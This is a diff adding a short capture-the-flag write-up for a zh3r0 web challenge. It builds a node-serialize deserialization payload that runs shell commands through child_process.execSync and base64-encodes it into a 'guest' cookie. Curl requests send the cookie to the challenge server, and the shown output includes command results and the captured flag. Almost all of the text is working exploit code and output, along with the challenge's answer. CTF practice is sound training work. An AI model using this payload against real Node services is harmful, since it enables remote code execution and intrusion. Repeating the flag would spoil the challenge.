@@ -1,0 +1,25 @@
+node create_payload.js
+```
+{"username":{"rce":"_$$ND_FUNC$$_(()=>{throw require('child_process').execSync('id')})()"}}
+```
+Base64
+```
+eyJ1c2VybmFtZSI6eyJyY2UiOiJfJCRORF9GVU5DJCRfKCgpPT57dGhyb3cgcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdpZCcpfSkoKSJ9fQ==
+```
+
+
+curl -X POST --cookie "guest=eyJ1c2VybmFtZSI6eyJyY2UiOiJfJCRORF9GVU5DJCRfKCgpPT57dGhyb3cgcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdpZCcpfSkoKSJ9fQ==" http://web.zh3r0.cf:6666/guest
+```
+<pre>uid=1000(node) gid=1000(node) groups=1000(node)<br></pre>
+```
+
+cat /flag.txt
+
+curl -X POST --cookie "guest=eyJ1c2VybmFtZSI6eyJyY2UiOiJfJCRORF9GVU5DJCRfKCgpPT57dGhyb3cgcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjYXQgL2ZsYWcudHh0Jyl9KSgpIn19" http://web.zh3r0.cf:6666/guest
+```
+<pre>zh3r0{4ll_y0u_h4d_t0_d0_w4s_m0v3_th3_0bjc3ts_3mper0r}<br></pre>
+```
+
+===================== Solution 2 =====================
+
+python rce.py
